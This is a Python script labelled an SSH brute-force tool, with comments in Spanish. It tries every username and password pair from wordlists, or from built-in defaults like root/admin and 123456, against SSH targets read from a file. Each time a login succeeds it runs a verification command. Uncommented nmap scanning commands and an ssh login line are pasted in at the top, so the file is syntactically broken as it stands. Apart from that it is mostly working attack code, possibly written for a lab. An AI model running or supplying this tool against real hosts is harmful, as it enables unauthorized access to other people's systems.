#!/usr/bin/env python3
import paramiko
import socket
import time
import random
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# nmap -p 22,80 -iL targets.txt -T4
# Mostrar SOLO hosts con puerto 22 ABIERTO
nmap -p 22 -iL targets.txt --open

# Mostrar SOLO hosts con puerto 22 ABIERTO y guardar resultado
nmap -p 22 -iL targets.txt --open -oG ssh_open_hosts.txt

# Escanear puertos 22 y 80, mostrar solo los abiertos
nmap -p 22,80 -iL targets.txt --open -oG open_ports.txt

# Con detección de servicio y solo mostrar abiertos
nmap -p 22,80 -iL targets.txt -sV --open
ssh -o HostKeyAlgorithms=+ssh-rsa kali@192.168.0.90



# Configuración CORREGIDA
USER_FILE = 'users.txt'          # ✅ Corregido
PASS_FILE = 'passwords.txt'      # ✅ Corregido
TARGETS_FILE = 'targets.txt'

# Parámetros de control
MAX_THREADS = 5
DELAY_BETWEEN_ATTEMPTS = 0.3
CONNECTION_TIMEOUT = 5
SHOW_FAILED_ATTEMPTS = True      # ✅ Cambiado a True para debugging
SHOW_PROGRESS = True
PROGRESS_INTERVAL = 1            # ✅ Mostrar más progreso

# Listas de fallback expandidas
FALLBACK_USERS = [
    'kali', 'root', 'admin', 'user', 'test', 'ubuntu'
]

FALLBACK_PASSWORDS = [
    'kali', 'password', '123456', 'admin', 'root', '1234', 'test'
]

def load_wordlist(path, fallback_list=None):
    """Carga un fichero, eliminando vacíos y comentarios."""
    p = Path(path)
    if not p.exists():
        if fallback_list:
            print(f"[!] No existe {path}, usando lista por defecto ({len(fallback_list)} items)")
            return fallback_list.copy()
        raise FileNotFoundError(f"No existe: {path}")

    items = []
    with p.open('r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            items.append(line)

    print(f"[+] Cargados {len(items)} items desde {path}")
    return items

def load_targets():
    """Carga las IPs/dominios objetivo."""
    targets = []

    try:
        targets = load_wordlist(TARGETS_FILE)
        if targets:
            return targets
    except FileNotFoundError:
        pass

    print("[?] No se encontró targets.txt")
    while True:
        target = input("Ingresa una IP/dominio objetivo (o 'fin' para terminar): ").strip()
        if target.lower() == 'fin':
            break
        if target:
            targets.append(target)

    return targets

def test_ssh_connection(target, port, username, password, attempt_num, total_attempts):
    """Intenta conectarse por SSH con las credenciales proporcionadas."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[{attempt_num}/{total_attempts}] Probando: {username}@{target} con '{password}'")

        client.connect(target, port=port, username=username, password=password,
                      timeout=CONNECTION_TIMEOUT, banner_timeout=10)

        # Verificar conexión
        stdin, stdout, stderr = client.exec_command('whoami && hostname')
        output = stdout.read().decode().strip()
        user_verified = output.split('\n')[0] if output else username

        print(f"    ✅ Comando ejecutado: {output}")

        client.close()
        return True, user_verified, None

    except paramiko.AuthenticationException:
        print(f"    ❌ Auth fallida: {username}:{password}")
        return False, None, "Authentication failed"

    except paramiko.SSHException as e:
        error_msg = f"SSH Error: {str(e)}"
        print(f"    ❌ SSH Exception: {error_msg}")
        return False, None, error_msg

    except socket.timeout:
        print(f"    ❌ Timeout conectando a {target}")
        return False, None, "Connection timeout"

    except Exception as e:
        error_msg = f"Error: {str(e)}"
        print(f"    ❌ Error general: {error_msg}")
        return False, None, error_msg

    finally:
        client.close()

def brute_ssh_target(target_data):
    """Realiza fuerza bruta SSH contra un objetivo específico."""
    target, port, attempts = target_data
    found_credentials = []

    print(f"\n🎯 Iniciando ataque SSH contra {target}:{port}")
    print(f"📊 Combinaciones a probar: {len(attempts)}")
    print("-" * 50)

    start_time = time.time()

    for i, (username, password) in enumerate(attempts, 1):
        success, verified_user, error = test_ssh_connection(target, port, username, password, i, len(attempts))

        if success:
            print(f"\n🎉 ✅ CONEXIÓN EXITOSA: {username}:{password} @ {target}")
            print(f"    👤 Usuario verificado: {verified_user}")
            found_credentials.append((username, password, verified_user))

        time.sleep(DELAY_BETWEEN_ATTEMPTS)

    elapsed_time = time.time() - start_time
    return target, port, found_credentials, elapsed_time, len(found_credentials)

def main():
    print("🔐 SSH BRUTE FORCE TOOL")
    print("=" * 50)

    # Cargar datos
    try:
        users = load_wordlist(USER_FILE, FALLBACK_USERS)
        passwords = load_wordlist(PASS_FILE, FALLBACK_PASSWORDS)
        targets = load_targets()

        if not targets:
            print("[-] No se especificaron objetivos")
            return

    except Exception as e:
        print(f"[-] Error cargando archivos: {e}")
        return

    # Preparar combinaciones
    all_target_data = []

    for target in targets:
        if ':' in target:
            target_ip, target_port = target.split(':')
            target_port = int(target_port)
        else:
            target_ip = target
            target_port = 22

        # Combinación cartesiana users x passwords
        attempts = [(u, p) for u in users for p in passwords]
        all_target_data.append((target_ip, target_port, attempts))

    # Estadísticas
    total_attempts = sum(len(data[2]) for data in all_target_data)
    total_targets = len(all_target_data)

    print(f"\n📈 ESTADÍSTICAS GLOBALES:")
    print(f"   • Objetivos: {total_targets}")
    print(f"   • Usuarios: {len(users)}")
    print(f"   • Contraseñas: {len(passwords)}")
    print(f"   • Intentos totales: {total_attempts}")
    print(f"   • Hilos: {MAX_THREADS}")
    print("=" * 50)

    # Ejecutar ataques
    all_results = []

    for target_data in all_target_data:
        result = brute_ssh_target(target_data)
        all_results.append(result)

    # Resumen final
    print("\n" + "=" * 60)
    print("🎊 RESUMEN FINAL")
    print("=" * 60)

    total_found = 0
    total_time = 0

    for target, port, credentials, elapsed, successful in all_results:
        total_time += elapsed
        total_found += len(credentials)

        print(f"\n🎯 OBJETIVO: {target}:{port}")
        print(f"   ⏱️  Tiempo: {elapsed:.1f}s")
        print(f"   ✅ Credenciales encontradas: {len(credentials)}")

        if credentials:
            for user, pwd, verified in credentials:
                print(f"      🔑 {user}:{pwd} → {verified}")
        else:
            print("      ❌ No se encontraron credenciales válidas")

    print(f"\n📊 TOTAL GLOBAL:")
    print(f"   • Credenciales encontradas: {total_found}")
    print(f"   • Tiempo total: {total_time:.1f}s")
    if total_time > 0:
        print(f"   • Velocidad promedio: {total_attempts/total_time:.1f} intentos/segundo")
    print("=" * 60)

if __name__ == '__main__':
    main()
